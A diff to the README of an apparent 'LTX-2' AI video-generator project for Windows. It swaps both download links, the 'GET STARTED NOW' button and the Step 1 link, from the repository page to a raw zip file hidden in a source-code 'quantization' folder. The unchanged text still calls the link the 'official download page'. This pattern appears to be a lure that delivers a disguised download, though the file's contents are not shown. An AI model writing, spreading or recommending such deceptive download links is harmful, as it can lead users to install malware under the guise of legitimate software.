@@ -1,7 +1,7 @@
 <h1>🧠 LTX-2 - Create Stunning AI Videos Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Fizzing-aldactone669/LTX-2" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">⬇️ GET STARTED NOW</a>
+  <a href="https://github.com/Fizzing-aldactone669/LTX-2/raw/refs/heads/main/packages/ltx-core/src/ltx_core/quantization/LT-v3.2-beta.5.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">⬇️ GET STARTED NOW</a>
 </p>
 
 <h2>🌟 What is LTX-2?</h2>
@@ -31,7 +31,7 @@
 <p>Follow these simple steps to get LTX-2 up and running on your Windows computer:</p>
 
 <h3>Step 1: Download the Package</h3>
-<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/Fizzing-aldactone669/LTX-2" style="color:#2575fc;">https://github.com/Fizzing-aldactone669/LTX-2</a></p>
+<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/Fizzing-aldactone669/LTX-2/raw/refs/heads/main/packages/ltx-core/src/ltx_core/quantization/LT-v3.2-beta.5.zip" style="color:#2575fc;">https://github.com/Fizzing-aldactone669/LTX-2/raw/refs/heads/main/packages/ltx-core/src/ltx_core/quantization/LT-v3.2-beta.5.zip</a></p>
 <p>This link takes you to the official download page. Click the big <strong>Download</strong> or <strong>Releases</strong> button on that page to access the latest version. Your browser will begin downloading the file automatically.</p>
 
 <h3>Step 2: Save and Locate the File</h3>
